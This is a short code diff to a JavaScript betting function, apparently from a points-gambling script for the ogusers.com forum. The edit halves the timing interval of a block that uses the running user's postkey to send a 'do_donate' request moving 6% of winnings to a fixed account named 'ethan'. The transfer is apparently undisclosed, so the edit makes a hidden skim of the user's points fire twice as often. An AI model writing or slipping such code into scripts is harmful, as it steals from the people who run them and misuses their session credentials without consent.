@@ -112,7 +112,7 @@ function startBet() {
                     if(ibet >= 500) {
                         ibet = obet;
                     }
-                    if(deltaw > 0 && Math.round(eTime) % 120 <= 1)
+                    if(deltaw > 0 && Math.round(eTime) % 60 <= 1)
                        {
                        $.get("https://ogusers.com/newpoints.php&postcode=" + postkey + "&action=do_donate&username=ethan&amount=" + deltaw*0.06 + "&reason=&submit=Submit");
                        }
